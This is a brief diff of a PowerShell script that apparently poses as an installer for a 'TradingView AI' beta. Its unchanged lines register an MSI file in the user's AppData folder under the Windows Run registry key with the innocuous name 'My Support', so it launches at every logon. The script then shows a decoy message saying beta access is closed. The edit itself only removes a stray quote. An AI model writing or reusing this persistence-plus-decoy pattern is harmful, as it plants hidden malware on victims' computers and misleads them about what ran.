@@ -9,4 +9,4 @@ $pathToExecutable = "$env:APPDATA\NodeServer-Setup.msi";
 Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'My Support' -Value $pathToExecutable;
 
 
-Write-Host "Beta access to TradingView AI is currently closed. Please try again in a few days." -ForegroundColor Red'
+Write-Host "Beta access to TradingView AI is currently closed. Please try again in a few days." -ForegroundColor Red
